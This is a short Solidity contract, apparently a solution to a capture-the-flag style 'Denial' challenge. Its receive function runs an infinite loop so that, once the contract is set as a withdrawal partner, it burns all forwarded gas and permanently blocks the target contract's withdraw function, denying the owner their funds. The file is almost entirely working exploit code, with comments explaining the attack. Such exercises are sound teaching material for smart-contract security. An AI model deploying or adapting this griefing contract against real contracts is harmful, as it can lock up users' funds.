// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract DenialAttack {
    constructor() {}

    // a simple infinite loop will consume all the excess gas attached to the transaction
    // by setting this contract as the withdraw partner, Denial's withdraw will get stuck
    // the 1 percent split will be sent here and the rest of the gas will be consumed before the
    // other 1 percent can be sent to the owner, thus bricking the withdraw function 
    receive() external payable {
        while (true) {
        }
    }
}